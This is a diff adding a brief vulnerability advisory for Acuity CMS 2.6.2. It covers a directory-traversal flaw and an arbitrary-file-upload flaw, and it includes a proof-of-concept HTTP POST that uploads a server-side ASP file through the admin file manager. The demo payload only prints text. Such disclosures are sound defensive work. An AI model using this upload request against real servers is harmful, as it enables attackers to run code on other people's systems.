@@ -1,0 +1,40 @@
+source: http://www.securityfocus.com/bid/53616/info
+
+Acuity CMS is prone to a directory-traversal vulnerability and an arbitrary-file-upload vulnerability.
+
+An attacker can exploit these issues to obtain sensitive information, to upload arbitrary code, and run it in the context of the webserver process.
+
+Acuity CMS 2.6.2 is vulnerable; prior versions may also be affected. 
+
+[REQUEST]
+POST /admin/file_manager/file_upload_submit.asp HTTP/1.1
+Host: localhost
+Cookie: ASPSESSIONID=XXXXXXXXXXXXXXX
+
+-----------------------------6dc3a236402e2
+Content-Disposition: form-data; name="path"
+
+/images
+-----------------------------6dc3a236402e2
+Content-Disposition: form-data; name="rootpath"
+
+/
+-----------------------------6dc3a236402e2
+Content-Disposition: form-data; name="rootdisplay"
+
+http://localhost/
+-----------------------------6dc3a236402e2
+Content-Disposition: form-data; name="status"
+
+confirmed
+-----------------------------6dc3a236402e2
+Content-Disposition: form-data; name="action"
+
+fileUpload
+-----------------------------6dc3a236402e2
+Content-Disposition: form-data; name="file1"; filename="0wned.asp"
+Content-Type: application/octet-stream
+
+<% response.write("0wned!") %>
+
+-----------------------------6dc3a236402e2--
